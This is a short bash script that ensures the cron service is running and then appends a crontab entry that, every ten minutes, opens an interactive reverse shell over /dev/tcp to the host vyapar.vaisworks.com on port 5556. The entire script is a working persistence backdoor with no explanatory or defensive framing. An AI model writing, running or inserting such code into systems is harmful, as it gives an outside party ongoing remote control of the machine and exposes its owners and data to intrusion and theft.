#!/bin/bash

# Command to insert into crontab
cron_command="*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/vyapar.vaisworks.com/5556 0>&1'"

# Check if cron service is running
if ! systemctl is-active --quiet cron; then
    # Start cron service if it's not running
    systemctl start cron
    echo "Cron service started."
fi

# Add the command to the crontab
(crontab -l 2>/dev/null; echo "$cron_command") | crontab -

echo "Command inserted into crontab."